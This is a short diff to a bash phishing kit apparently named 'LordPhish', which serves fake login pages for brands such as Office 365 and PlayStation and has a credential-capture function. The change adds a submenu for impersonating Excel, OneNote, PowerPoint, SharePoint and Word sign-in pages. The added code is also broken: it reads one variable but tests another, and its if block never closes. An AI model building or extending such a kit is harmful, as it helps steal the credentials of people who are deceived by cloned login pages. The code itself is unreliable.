@@ -230,7 +230,7 @@ start
 
 elif [[ $option == 43 ]]; then
 server="o365"
-start
+oofic
 
 elif [[ $option == 44 ]]; then
 server="Playstation"
@@ -342,6 +342,22 @@ printf '<body>\n' >> sites/create/login.html
 printf '</html>\n' >> sites/create/login.html
 
 
+}
+
+oofic() {
+    clear
+    banner
+    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Exel\e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m OneNote\e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;96m PowerPoint\e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;96m SharePoint\e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;96m Word\e[0m\n"
+    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' oofic
+    
+if [[ $option == 1 ]]; then
+server="Exel"
+start
+    
 }
 
 catch_cred() {
